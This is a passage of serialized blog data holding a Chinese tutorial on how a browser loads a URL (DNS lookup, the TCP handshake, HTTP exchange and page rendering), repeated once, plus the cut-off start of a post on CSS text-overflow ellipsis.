地址相互映射的一个分布式数据库，能够使人更方便地访问互联网</p>\n<ul>\n<li>第一步：客户机提出域名解析请求,并将该请求发送给本地的域名服务器.</li>\n<li>第二步：当本地的域名服务器收到请求后,就先查询本地的缓存,如果有该纪录项,则本地的域名服务器就直接把查询的结果返回.</li>\n<li>第三步：如果本地的缓存中没有该纪录,则本地域名服务器就直接把请求发给根域名服务器,然后根域名服务器再返回给本地域名服务器一个所查询域(根的子域)的主域名服务器的地址.</li>\n<li>第四步：本地服务器再向上一步返回的域名服务器发送请求,然后接受请求的服务器查询自己的缓存,如果没有该纪录,则返回相关的下级的域名服务器的地址.</li>\n<li>第五步：重复第四步,直到找到正确的纪录.</li>\n<li>第六步：本地域名服务器把返回的结果保存到缓存,以备下一次使用,同时还将结果返回给客户机</li>\n</ul>\n<h2 id=\"IP-地址-（Internet-Protocol-Address，网际协议地址）\"><a href=\"#IP-地址-（Internet-Protocol-Address，网际协议地址）\" class=\"headerlink\" title=\"IP 地址 （Internet Protocol Address，网际协议地址）\"></a>IP 地址 （Internet Protocol Address，网际协议地址）</h2><p>IP 地址是指互联网协议地址，是 IP Address 的缩写。IP 地址是 IP 协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。IP 地址是一个 32 位的二进制数，比如 127.0.0.1 为本机 IP。域名就相当于 IP 地址乔装打扮的伪装者，带着一副面具。它的作用就是便于记忆和沟通的一组服务器的地址。用户通常使用主机名或域名来访问对方的计算机，而不是直接通过 IP 地址访问。因为与 IP 地址的一组纯数字相比，用字母配合数字的表示形式来指定计算机名更符合人类的记忆习惯。但要让计算机去理解名称，相对而言就变得困难了。因为计算机更擅长处理一长串数字。为了解决上述的问题，DNS 服务应运而生。</p>\n<h2 id=\"DNS-服务\"><a href=\"#DNS-服务\" class=\"headerlink\" title=\"DNS 服务\"></a>DNS 服务</h2><p>DNS 服务是和 HTTP 协议一样的应用层的协议，他提供域名到 IP 地址见的解析服务。<br>计算机即可以被赋予 IP 地址，如：127.0.0.1，也可以被赋予主机名和域名。比如：<a href=\"http://www.hackr.jp/\">www.hackr.jp</a><br>用户通常使用主机名和域名来访问对方的计算机，而不是通过 IP 地址访问。因为 IP 是由一组纯数字，不太符合人类的记忆习惯。<br>但是让计算机去理解主机名和域名就比较困难，因为计算机更擅长处理一长串数字。<br>为了解决上述问题，DNS 服务就应运而生了。DNS 协议提供通过域名查找 IP 地址，或者逆向通过 IP 地址反查找域名的服务。<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/dns.jpg\" alt=\"dns\"></p>\n<h2 id=\"浏览器如何通过域名去查询-URL-对应的-IP-呢\"><a href=\"#浏览器如何通过域名去查询-URL-对应的-IP-呢\" class=\"headerlink\" title=\"浏览器如何通过域名去查询 URL 对应的 IP 呢\"></a>浏览器如何通过域名去查询 URL 对应的 IP 呢</h2><ul>\n<li>浏览器缓存：浏览器会按照一定的频率缓存 DNS 记录。</li>\n<li>操作系统缓存：如果浏览器缓存中找不到需要的 DNS 记录，那就去操作系统中找。</li>\n<li>路由缓存：路由器也有 DNS 缓存。</li>\n<li>ISP 的 DNS 服务器：ISP 是互联网服务提供商(Internet Service Provider)的简称，ISP 有专门的 DNS 服务器应对 DNS 查询请求。</li>\n<li>根服务器：ISP 的 DNS 服务器还找不到的话，它就会向根服务器发出请求，进行递归查询（DNS 服务器先问根域名服务器.com 域名服务器的 IP 地址，然后再问.baidu 域名服务器，依次类推）</li>\n</ul>\n<h1 id=\"TCP（Transmission-Control-Protocol，传输控制协议）\"><a href=\"#TCP（Transmission-Control-Protocol，传输控制协议）\" class=\"headerlink\" title=\"TCP（Transmission Control Protocol，传输控制协议）\"></a>TCP（Transmission Control Protocol，传输控制协议）</h1><p><strong>三次握手</strong></p>\n<ul>\n<li>第一次握手：建立连接时，客户端发送 syn 包（syn=j）到服务器，并进入 SYN_SENT 状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</li>\n<li>第二次握手：服务器收到 syn 包，必须确认客户的 SYN（ack=j+1），同时自己也发送一个 SYN 包（syn=k），即 SYN+ACK 包，此时服务器进入 SYN_RECV 状态；</li>\n<li>第三次握手：客户端收到服务器的 SYN+ACK 包，向服务器发送确认包 ACK(ack=k+1），此包发送完毕，客户端和服务器进入 ESTABLISHED（TCP 连接成功）状态，完成三次握手。<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/tcp.jpg\" alt=\"tcp\"></li>\n</ul>\n<h1 id=\"发送-HTTP-请求\"><a href=\"#发送-HTTP-请求\" class=\"headerlink\" title=\"发送 HTTP 请求\"></a>发送 HTTP 请求</h1><p><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/http2.jpg\" alt=\"http2\"></p>\n<p>HTTP 请求分为三个部分：</p>\n<ul>\n<li>TCP 三次握手<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/tcp.jpg\" alt=\"tcp\"></li>\n<li>http 请求响应信息</li>\n<li>关闭 TCP 连接。<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/tcp2.jpg\" alt=\"tcp2\"><br>请求头<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/request.jpg\" alt=\"request\"></li>\n</ul>\n<p>客户端发送 http 请求，服务端返回响应<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/req_res.jpg\" alt=\"req_res\"></p>\n<h1 id=\"服务器处理请求并返回-HTTP-报文\"><a href=\"#服务器处理请求并返回-HTTP-报文\" class=\"headerlink\" title=\"服务器处理请求并返回 HTTP 报文\"></a>服务器处理请求并返回 HTTP 报文</h1><p>响应头<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/response.jpg\" alt=\"response\"></p>\n<h1 id=\"浏览器解析渲染页面\"><a href=\"#浏览器解析渲染页面\" class=\"headerlink\" title=\"浏览器解析渲染页面\"></a>浏览器解析渲染页面</h1><p>浏览器解析渲染页面分为一下五个步骤：</p>\n<ul>\n<li>根据 HTML 解析出 DOM 树</li>\n<li>根据 CSS 解析生成 CSS 规则树</li>\n<li>结合 DOM 树和 CSS 规则树，生成渲染树</li>\n<li>根据渲染树计算每一个节点的信息</li>\n<li>根据计算好的信息绘制页面</li>\n</ul>\n<p><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/html.jpg\" alt=\"html\"></p>\n<h2 id=\"1-根据-HTML-解析-DOM-树\"><a href=\"#1-根据-HTML-解析-DOM-树\" class=\"headerlink\" title=\"1.根据 HTML 解析 DOM 树\"></a>1.根据 HTML 解析 DOM 树</h2><ul>\n<li>根据 HTML 的内容，将标签按照结构解析成为 DOM 树，DOM 树解析的过程是一个深度优先遍历。即先构建当前节点的所有子节点，再构建下一个兄弟节点。</li>\n<li>在读取 HTML 文档，构建 DOM 树的过程中，若遇到 script 标签，则 DOM 树的构建会暂停，直至脚本执行完毕。</li>\n</ul>\n<h2 id=\"2-根据-CSS-解析生成-CSS-规则树\"><a href=\"#2-根据-CSS-解析生成-CSS-规则树\" class=\"headerlink\" title=\"2.根据 CSS 解析生成 CSS 规则树\"></a>2.根据 CSS 解析生成 CSS 规则树</h2><ul>\n<li>解析 CSS 规则树时 js 执行将暂停，直至 CSS 规则树就绪。</li>\n<li>浏览器在 CSS 规则树生成之前不会进行渲染。</li>\n</ul>\n<h2 id=\"3-结合-DOM-树和-CSS-规则树，生成渲染树\"><a href=\"#3-结合-DOM-树和-CSS-规则树，生成渲染树\" class=\"headerlink\" title=\"3.结合 DOM 树和 CSS 规则树，生成渲染树\"></a>3.结合 DOM 树和 CSS 规则树，生成渲染树</h2><ul>\n<li>DOM 树和 CSS 规则树全部准备好了以后，浏览器才会开始构建渲染树。</li>\n<li>精简 CSS 并可以加快 CSS 规则树的构建，从而加快页面相应速度。</li>\n</ul>\n<h2 id=\"4-根据渲染树计算每一个节点的信息（布局）\"><a href=\"#4-根据渲染树计算每一个节点的信息（布局）\" class=\"headerlink\" title=\"4.根据渲染树计算每一个节点的信息（布局）\"></a>4.根据渲染树计算每一个节点的信息（布局）</h2><ul>\n<li>布局：通过渲染树中渲染对象的信息，计算出每一个渲染对象的位置和尺寸</li>\n<li>回流：在布局完成后，发现了某个部分发生了变化影响了布局，那就需要倒回去重新渲染。</li>\n</ul>\n<h2 id=\"5-根据计算好的信息绘制页面\"><a href=\"#5-根据计算好的信息绘制页面\" class=\"headerlink\" title=\"5.根据计算好的信息绘制页面\"></a>5.根据计算好的信息绘制页面</h2><ul>\n<li>绘制阶段，系统会遍历呈现树，并调用呈现器的“paint”方法，将呈现器的内容显示在屏幕上。</li>\n<li>重绘：某个元素的背景颜色，文字颜色等，不影响元素周围或内部布局的属性，将只会引起浏览器的重绘。</li>\n<li>回流：某个元素的尺寸发生了变化，则需重新计算渲染树，重新渲染。</li>\n</ul>\n<!-- # TCP四次挥手 -->\n\n<h4 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h4><p><a href=\"https://book.douban.com/subject/25863515/\">图解 HTTP</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><h2 id=\"TCP-IP-协议族\"><a href=\"#TCP-IP-协议族\" class=\"headerlink\" title=\"TCP/IP 协议族\"></a>TCP/IP 协议族</h2><p>HTTP(HyperText Transfer Protocol,超文本传输协议)<br><strong>TCP/IP 协议族</strong>，按层次分：</p>\n<ul>\n<li><p>应用层<br>HTTP(HyperText Transfer Protocol,超文本传输协议)<br>FTP(File Transfer Protocal,文件传输协议)<br>DNS(Domain Name System,域名系统)</p>\n</li>\n<li><p>传输层<br>TCP(Transmission Control Protocal,传输控制协议)<br>UDP(User Data Protocal,用户数据报协议)</p>\n</li>\n<li><p>网络层<br>IP(Internet Protocal,互联网协议)（IP 地址—-ARP 协议—-MAC 地址）</p>\n</li>\n<li><p>数据链路层<br>控制操作系统<br>硬件设备驱动<br>NIC(Network Interface Card,网络适配器，即网卡)<br>光纤</p>\n</li>\n</ul>\n<h1 id=\"在地址栏输入-URL-到页面展示过程中，到底发生了什么？\"><a href=\"#在地址栏输入-URL-到页面展示过程中，到底发生了什么？\" class=\"headerlink\" title=\"在地址栏输入 URL 到页面展示过程中，到底发生了什么？\"></a>在地址栏输入 URL 到页面展示过程中，到底发生了什么？</h1><p><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/url.jpg\" alt=\"url\"></p>\n<h2 id=\"过程如下：\"><a href=\"#过程如下：\" class=\"headerlink\" title=\"过程如下：\"></a>过程如下：</h2><ul>\n<li><p>DNS 解析：将域名解析为 IP</p>\n</li>\n<li><p>TCP 连接：TCP 三次握手</p>\n</li>\n<li><p>发送 HTTP 请求</p>\n</li>\n<li><p>服务器处理请求并返回 HTTP 报文</p>\n</li>\n<li><p>浏览器解析渲染页面</p>\n</li>\n</ul>\n<h1 id=\"DNS-解析\"><a href=\"#DNS-解析\" class=\"headerlink\" title=\"DNS 解析\"></a>DNS 解析</h1><h2 id=\"URI（统一资源标识符）\"><a href=\"#URI（统一资源标识符）\" class=\"headerlink\" title=\"URI（统一资源标识符）\"></a>URI（统一资源标识符）</h2><p><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/uri.jpg\" alt=\"uri\"></p>\n<h2 id=\"URL（统一资源定位符）\"><a href=\"#URL（统一资源定位符）\" class=\"headerlink\" title=\"URL（统一资源定位符）\"></a>URL（统一资源定位符）</h2><p>URL（Uniform Resource Locator），统一资源定位符，用于定位互联网上资源，俗称网址。 比如 <a href=\"http://www.w3school.com.cn/html/index.asp%EF%BC%8C%E9%81%B5%E5%AE%88%E4%BB%A5%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99%EF%BC%9A\">http://www.w3school.com.cn/html/index.asp，遵守以下的语法规则：</a></p>\n<p><strong>scheme://host.domain:port/path/filename</strong> 各部分解释如下：</p>\n<ul>\n<li>scheme - 定义因特网服务的类型。常见的协议有 http、https、ftp、file，其中最常见的类型是 http，而 https 则是进行加密的网络传输。</li>\n<li>host - 定义域主机（http 的默认主机是 www）</li>\n<li>domain - 定义因特网域名，比如 w3school.com.cn</li>\n<li>port - 定义主机上的端口号（http 的默认端口号是 80）</li>\n<li>path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。</li>\n<li>filename - 定义文档/资源的名称</li>\n</ul>\n<h2 id=\"DNS（Domain-Name-System，域名系统）\"><a href=\"#DNS（Domain-Name-System，域名系统）\" class=\"headerlink\" title=\"DNS（Domain Name System，域名系统）\"></a>DNS（Domain Name System，域名系统）</h2><p>域名系统（英文：DomainNameSystem，缩写：DNS）是互联网的一项服务。它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网</p>\n<ul>\n<li>第一步：客户机提出域名解析请求,并将该请求发送给本地的域名服务器.</li>\n<li>第二步：当本地的域名服务器收到请求后,就先查询本地的缓存,如果有该纪录项,则本地的域名服务器就直接把查询的结果返回.</li>\n<li>第三步：如果本地的缓存中没有该纪录,则本地域名服务器就直接把请求发给根域名服务器,然后根域名服务器再返回给本地域名服务器一个所查询域(根的子域)的主域名服务器的地址.</li>\n<li>第四步：本地服务器再向上一步返回的域名服务器发送请求,然后接受请求的服务器查询自己的缓存,如果没有该纪录,则返回相关的下级的域名服务器的地址.</li>\n<li>第五步：重复第四步,直到找到正确的纪录.</li>\n<li>第六步：本地域名服务器把返回的结果保存到缓存,以备下一次使用,同时还将结果返回给客户机</li>\n</ul>\n<h2 id=\"IP-地址-（Internet-Protocol-Address，网际协议地址）\"><a href=\"#IP-地址-（Internet-Protocol-Address，网际协议地址）\" class=\"headerlink\" title=\"IP 地址 （Internet Protocol Address，网际协议地址）\"></a>IP 地址 （Internet Protocol Address，网际协议地址）</h2><p>IP 地址是指互联网协议地址，是 IP Address 的缩写。IP 地址是 IP 协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。IP 地址是一个 32 位的二进制数，比如 127.0.0.1 为本机 IP。域名就相当于 IP 地址乔装打扮的伪装者，带着一副面具。它的作用就是便于记忆和沟通的一组服务器的地址。用户通常使用主机名或域名来访问对方的计算机，而不是直接通过 IP 地址访问。因为与 IP 地址的一组纯数字相比，用字母配合数字的表示形式来指定计算机名更符合人类的记忆习惯。但要让计算机去理解名称，相对而言就变得困难了。因为计算机更擅长处理一长串数字。为了解决上述的问题，DNS 服务应运而生。</p>\n<h2 id=\"DNS-服务\"><a href=\"#DNS-服务\" class=\"headerlink\" title=\"DNS 服务\"></a>DNS 服务</h2><p>DNS 服务是和 HTTP 协议一样的应用层的协议，他提供域名到 IP 地址见的解析服务。<br>计算机即可以被赋予 IP 地址，如：127.0.0.1，也可以被赋予主机名和域名。比如：<a href=\"http://www.hackr.jp/\">www.hackr.jp</a><br>用户通常使用主机名和域名来访问对方的计算机，而不是通过 IP 地址访问。因为 IP 是由一组纯数字，不太符合人类的记忆习惯。<br>但是让计算机去理解主机名和域名就比较困难，因为计算机更擅长处理一长串数字。<br>为了解决上述问题，DNS 服务就应运而生了。DNS 协议提供通过域名查找 IP 地址，或者逆向通过 IP 地址反查找域名的服务。<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/dns.jpg\" alt=\"dns\"></p>\n<h2 id=\"浏览器如何通过域名去查询-URL-对应的-IP-呢\"><a href=\"#浏览器如何通过域名去查询-URL-对应的-IP-呢\" class=\"headerlink\" title=\"浏览器如何通过域名去查询 URL 对应的 IP 呢\"></a>浏览器如何通过域名去查询 URL 对应的 IP 呢</h2><ul>\n<li>浏览器缓存：浏览器会按照一定的频率缓存 DNS 记录。</li>\n<li>操作系统缓存：如果浏览器缓存中找不到需要的 DNS 记录，那就去操作系统中找。</li>\n<li>路由缓存：路由器也有 DNS 缓存。</li>\n<li>ISP 的 DNS 服务器：ISP 是互联网服务提供商(Internet Service Provider)的简称，ISP 有专门的 DNS 服务器应对 DNS 查询请求。</li>\n<li>根服务器：ISP 的 DNS 服务器还找不到的话，它就会向根服务器发出请求，进行递归查询（DNS 服务器先问根域名服务器.com 域名服务器的 IP 地址，然后再问.baidu 域名服务器，依次类推）</li>\n</ul>\n<h1 id=\"TCP（Transmission-Control-Protocol，传输控制协议）\"><a href=\"#TCP（Transmission-Control-Protocol，传输控制协议）\" class=\"headerlink\" title=\"TCP（Transmission Control Protocol，传输控制协议）\"></a>TCP（Transmission Control Protocol，传输控制协议）</h1><p><strong>三次握手</strong></p>\n<ul>\n<li>第一次握手：建立连接时，客户端发送 syn 包（syn=j）到服务器，并进入 SYN_SENT 状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</li>\n<li>第二次握手：服务器收到 syn 包，必须确认客户的 SYN（ack=j+1），同时自己也发送一个 SYN 包（syn=k），即 SYN+ACK 包，此时服务器进入 SYN_RECV 状态；</li>\n<li>第三次握手：客户端收到服务器的 SYN+ACK 包，向服务器发送确认包 ACK(ack=k+1），此包发送完毕，客户端和服务器进入 ESTABLISHED（TCP 连接成功）状态，完成三次握手。<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/tcp.jpg\" alt=\"tcp\"></li>\n</ul>\n<h1 id=\"发送-HTTP-请求\"><a href=\"#发送-HTTP-请求\" class=\"headerlink\" title=\"发送 HTTP 请求\"></a>发送 HTTP 请求</h1><p><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/http2.jpg\" alt=\"http2\"></p>\n<p>HTTP 请求分为三个部分：</p>\n<ul>\n<li>TCP 三次握手<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/tcp.jpg\" alt=\"tcp\"></li>\n<li>http 请求响应信息</li>\n<li>关闭 TCP 连接。<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/tcp2.jpg\" alt=\"tcp2\"><br>请求头<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/request.jpg\" alt=\"request\"></li>\n</ul>\n<p>客户端发送 http 请求，服务端返回响应<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/req_res.jpg\" alt=\"req_res\"></p>\n<h1 id=\"服务器处理请求并返回-HTTP-报文\"><a href=\"#服务器处理请求并返回-HTTP-报文\" class=\"headerlink\" title=\"服务器处理请求并返回 HTTP 报文\"></a>服务器处理请求并返回 HTTP 报文</h1><p>响应头<br><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/response.jpg\" alt=\"response\"></p>\n<h1 id=\"浏览器解析渲染页面\"><a href=\"#浏览器解析渲染页面\" class=\"headerlink\" title=\"浏览器解析渲染页面\"></a>浏览器解析渲染页面</h1><p>浏览器解析渲染页面分为一下五个步骤：</p>\n<ul>\n<li>根据 HTML 解析出 DOM 树</li>\n<li>根据 CSS 解析生成 CSS 规则树</li>\n<li>结合 DOM 树和 CSS 规则树，生成渲染树</li>\n<li>根据渲染树计算每一个节点的信息</li>\n<li>根据计算好的信息绘制页面</li>\n</ul>\n<p><img src=\"%E5%9C%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/html.jpg\" alt=\"html\"></p>\n<h2 id=\"1-根据-HTML-解析-DOM-树\"><a href=\"#1-根据-HTML-解析-DOM-树\" class=\"headerlink\" title=\"1.根据 HTML 解析 DOM 树\"></a>1.根据 HTML 解析 DOM 树</h2><ul>\n<li>根据 HTML 的内容，将标签按照结构解析成为 DOM 树，DOM 树解析的过程是一个深度优先遍历。即先构建当前节点的所有子节点，再构建下一个兄弟节点。</li>\n<li>在读取 HTML 文档，构建 DOM 树的过程中，若遇到 script 标签，则 DOM 树的构建会暂停，直至脚本执行完毕。</li>\n</ul>\n<h2 id=\"2-根据-CSS-解析生成-CSS-规则树\"><a href=\"#2-根据-CSS-解析生成-CSS-规则树\" class=\"headerlink\" title=\"2.根据 CSS 解析生成 CSS 规则树\"></a>2.根据 CSS 解析生成 CSS 规则树</h2><ul>\n<li>解析 CSS 规则树时 js 执行将暂停，直至 CSS 规则树就绪。</li>\n<li>浏览器在 CSS 规则树生成之前不会进行渲染。</li>\n</ul>\n<h2 id=\"3-结合-DOM-树和-CSS-规则树，生成渲染树\"><a href=\"#3-结合-DOM-树和-CSS-规则树，生成渲染树\" class=\"headerlink\" title=\"3.结合 DOM 树和 CSS 规则树，生成渲染树\"></a>3.结合 DOM 树和 CSS 规则树，生成渲染树</h2><ul>\n<li>DOM 树和 CSS 规则树全部准备好了以后，浏览器才会开始构建渲染树。</li>\n<li>精简 CSS 并可以加快 CSS 规则树的构建，从而加快页面相应速度。</li>\n</ul>\n<h2 id=\"4-根据渲染树计算每一个节点的信息（布局）\"><a href=\"#4-根据渲染树计算每一个节点的信息（布局）\" class=\"headerlink\" title=\"4.根据渲染树计算每一个节点的信息（布局）\"></a>4.根据渲染树计算每一个节点的信息（布局）</h2><ul>\n<li>布局：通过渲染树中渲染对象的信息，计算出每一个渲染对象的位置和尺寸</li>\n<li>回流：在布局完成后，发现了某个部分发生了变化影响了布局，那就需要倒回去重新渲染。</li>\n</ul>\n<h2 id=\"5-根据计算好的信息绘制页面\"><a href=\"#5-根据计算好的信息绘制页面\" class=\"headerlink\" title=\"5.根据计算好的信息绘制页面\"></a>5.根据计算好的信息绘制页面</h2><ul>\n<li>绘制阶段，系统会遍历呈现树，并调用呈现器的“paint”方法，将呈现器的内容显示在屏幕上。</li>\n<li>重绘：某个元素的背景颜色，文字颜色等，不影响元素周围或内部布局的属性，将只会引起浏览器的重绘。</li>\n<li>回流：某个元素的尺寸发生了变化，则需重新计算渲染树，重新渲染。</li>\n</ul>\n<!-- # TCP四次挥手 -->\n\n<h4 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h4><p><a href=\"https://book.douban.com/subject/25863515/\">图解 HTTP</a></p>\n"},{"title":"文本溢出的处理方法","date":"2019-04-10T08:48:33.000Z","_content":"\n# CSS 文本溢出显示省略号\n\n项目中常常有这种需要我们对溢出文本进行\"...\"显示的操作，单行多行的情况都有,，具体情况根据设计稿\n\n先来看一下文本溢出的情况\n\n![img1](文本溢出的处理方法/img1.png)\n\n## 单行文本溢出\n\n```\n// 单行文本溢出显示...\n.ellipsis {\n  overflow: hidden;\n  text-overflow: ellipsis;\n  white-space: nowrap;\n}\n\n```\n\n![img2](文本溢出的处理方法/img2.png)\n\n## 多行文本溢出\n\n#### 利用 css 属性设置（仅适用于 WebKit 内核）\n\n```\n// 双行文本溢出显示...\n.multiellipsis {\n  overflow: hidden;\n  text-overflow: ellipsis;\n  display: -webkit-box;\n  -webkit-line-clamp: 2;\n  -webkit-box-orient: vertical;\n}\n```\n\n![img3](文本溢出的处理方法/img3.png)\n\n**移动端浏览器绝大部分是 WebKit 内核的，所以该方法适用于移动端**；\n\n- **-webkit-line-clamp** 用来限制在一个块元素显示的文本的行数,这是一个不规范的属性（unsupported WebKit 